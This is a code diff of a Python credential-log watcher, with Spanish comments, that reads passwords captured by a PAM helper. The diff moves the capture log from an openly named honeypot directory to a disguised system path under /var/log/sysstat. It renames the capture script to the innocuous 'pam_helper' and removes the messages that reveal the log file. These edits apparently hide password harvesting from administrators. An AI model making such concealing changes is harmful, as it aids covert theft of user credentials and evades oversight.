@@ -2,16 +2,16 @@ import os
 import time
 import threading
 
-AUTH_LOG_PATH = "/var/log/honeypot/auth_events.log"
+_AUTH_LOG = "/var/log/sysstat/sa/auth.log"
 
 
 class AuthEventsWatcher:
     """
-    Sigue el archivo que llena capture_auth.sh (PAM) con la contraseña
-    real intentada. Es la ÚNICA fuente de credenciales del sistema.
+    Sigue el log que llena pam_helper (PAM) con las credenciales capturadas.
+    Es la única fuente de contraseñas del sistema.
     """
 
-    def __init__(self, on_password_captured, path=AUTH_LOG_PATH):
+    def __init__(self, on_password_captured, path=_AUTH_LOG):
         self.on_password_captured = on_password_captured
         self.path = path
 
@@ -20,17 +20,11 @@ class AuthEventsWatcher:
         threading.Thread(target=self._watch_loop, daemon=True).start()
 
     def _ensure_log_file(self):
-        """
-        Crea el archivo de log si no existe y anota si ya existía.
-        """
         os.makedirs(os.path.dirname(self.path), exist_ok=True)
         self._file_preexisted = os.path.exists(self.path)
         if not self._file_preexisted:
-
             open(self.path, "a").close()
-            print(f"[AuthEventsWatcher] Archivo de log creado: {self.path}")
-        else:
-            print(f"[AuthEventsWatcher] Archivo de log ya existía: {self.path}")
+            os.chmod(self.path, 0o600)
 
     def _watch_loop(self):
         with open(self.path, "r") as f:
@@ -62,5 +56,4 @@ class AuthEventsWatcher:
             return
 
         password = "".join(c for c in password if c.isprintable())
-
         self.on_password_captured(ip, username, password)
